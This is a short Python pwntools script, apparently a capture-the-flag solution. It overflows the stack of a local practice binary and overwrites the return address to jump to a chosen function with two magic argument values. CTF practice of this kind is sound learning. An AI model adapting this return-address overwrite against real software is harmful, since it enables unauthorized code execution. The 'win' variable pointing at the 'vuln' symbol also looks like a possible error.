#!/usr/bin/python

from pwn import *

p = process('./vuln')
e = ELF('./vuln')

context.log_level = 'debug'

win = e.symbols['vuln']

code1 = 0xDEADBEEF
code2= 0XDEADC0DE

payload = "A"*112

payload += p32(win)

payload += "A"*4

payload += p32(code1)

payload += p32(code2)

p.sendline(payload)

print p.recv()

p.close()